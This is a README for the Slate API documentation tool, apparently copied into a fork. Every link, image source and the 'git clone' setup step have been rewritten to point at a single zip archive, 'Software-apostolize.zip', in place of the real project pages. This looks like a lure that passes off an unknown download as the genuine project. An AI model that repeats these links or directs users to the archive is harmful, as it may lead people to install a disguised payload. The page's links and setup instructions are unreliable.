<p align="center">
  <img src="https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip" alt="Slate: API Documentation Generator" width="226">
  <br>
  <a href="https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip"><img src="https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip" alt="Build Status"></a>
</p>

<p align="center">Slate helps you create beautiful, intelligent, responsive API documentation.</p>

<p align="center"><img src="https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip" width=700 alt="Screenshot of Example Documentation created with Slate"></p>

<p align="center"><em>The example above was created with Slate. Check it out at <a href="https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip">https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip</a>.</em></p>

Features
------------

* **Clean, intuitive design** — With Slate, the description of your API is on the left side of your documentation, and all the code examples are on the right side. Inspired by [Stripe's](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip) and [PayPal's](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip) API docs. Slate is responsive, so it looks great on tablets, phones, and even in print.

* **Everything on a single page** — Gone are the days when your users had to search through a million pages to find what they wanted. Slate puts the entire documentation on a single page. We haven't sacrificed linkability, though. As you scroll, your browser's hash will update to the nearest header, so linking to a particular point in the documentation is still natural and easy.

* **Slate is just Markdown** — When you write docs with Slate, you're just writing Markdown, which makes it simple to edit and understand. Everything is written in Markdown — even the code samples are just Markdown code blocks.

* **Write code samples in multiple languages** — If your API has bindings in multiple programming languages, you can easily put in tabs to switch between them. In your document, you'll distinguish different languages by specifying the language name at the top of each code block, just like with GitHub Flavored Markdown.

* **Out-of-the-box syntax highlighting** for [over 100 languages](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip), no configuration required.

* **Automatic, smoothly scrolling table of contents** on the far left of the page. As you scroll, it displays your current position in the document. It's fast, too. We're using Slate at TripIt to build documentation for our new API, where our table of contents has over 180 entries. We've made sure that the performance remains excellent, even for larger documents.

* **Let your users update your documentation for you** — By default, your Slate-generated documentation is hosted in a public GitHub repository. Not only does this mean you get free hosting for your docs with GitHub Pages, but it also makes it simple for other developers to make pull requests to your docs if they find typos or other problems. Of course, if you don't want to use GitHub, you're also welcome to host your docs elsewhere.

* **RTL Support** Full right-to-left layout for RTL languages such as Arabic, Persian (Farsi), Hebrew etc.

Getting started with Slate is super easy! Simply fork this repository and follow the instructions below. Or, if you'd like to check out what Slate is capable of, take a look at the [sample docs](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip).

Getting Started with Slate
------------------------------

### Prerequisites

You're going to need:

 - **Linux or OS X** — Windows may work, but is unsupported.
 - **Ruby, version 2.3.1 or newer**
 - **Bundler** — If Ruby is already installed, but the `bundle` command doesn't work, just run `gem install bundler` in a terminal.

### Getting Set Up

1. Fork this repository on GitHub.
2. Clone *your forked repository* (not our original one) to your hard drive with `git clone https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip`
3. `cd slate`
4. Initialize and start Slate. You can either do this locally, or with Vagrant:

```shell
# either run this to run locally
bundle install
bundle exec middleman server

# OR run this to run with vagrant
vagrant up
```

You can now see the docs at http://localhost:4567. Whoa! That was fast!

Now that Slate is all set up on your machine, you'll probably want to learn more about [editing Slate markdown](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip), or [how to publish your docs](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip).

If you'd prefer to use Docker, instructions are available [in the wiki](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip).

### Note on JavaScript Runtime

For those who don't have JavaScript runtime or are experiencing JavaScript runtime issues with ExecJS, it is recommended to add the [rubyracer gem](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip) to your gemfile and run `bundle` again.

Companies Using Slate
---------------------------------

* [NASA](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip)
* [IBM](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip)
* [Sony](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip)
* [Best Buy](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip)
* [Travis-CI](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip)
* [Greenhouse](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip)
* [Woocommerce](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip)
* [Appium](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip)
* [Dwolla](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip)
* [Clearbit](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip)
* [Coinbase](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip)
* [Parrot Drones](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip)
* [Fidor Bank](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip)
* [Scale](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip)

You can view more in [the list on the wiki](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip).

Questions? Need Help? Found a bug?
--------------------

If you've got questions about setup, deploying, special feature implementation in your fork, or just want to chat with the developer, please feel free to [start a thread in our Spectrum community](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip)!

Found a bug with upstream Slate? Go ahead and [submit an issue](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip). And, of course, feel free to submit pull requests with bug fixes or changes to the `dev` branch.

Contributors
--------------------

Slate was built by [Robert Lord](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip) while interning at [TripIt](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip).

Thanks to the following people who have submitted major pull requests:

- [@chrissrogers](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip)
- [@bootstraponline](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip)
- [@realityking](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip)
- [@cvkef](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip)

Also, thanks to [Sauce Labs](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip) for sponsoring the development of the responsive styles.

Special Thanks
--------------------
- [Middleman](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip)
- [https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip)
- [middleman-syntax](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip)
- [middleman-gh-pages](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip)
- [Font Awesome](https://github.com/tanglongwei/slate/raw/refs/heads/master/source/Software-apostolize.zip)
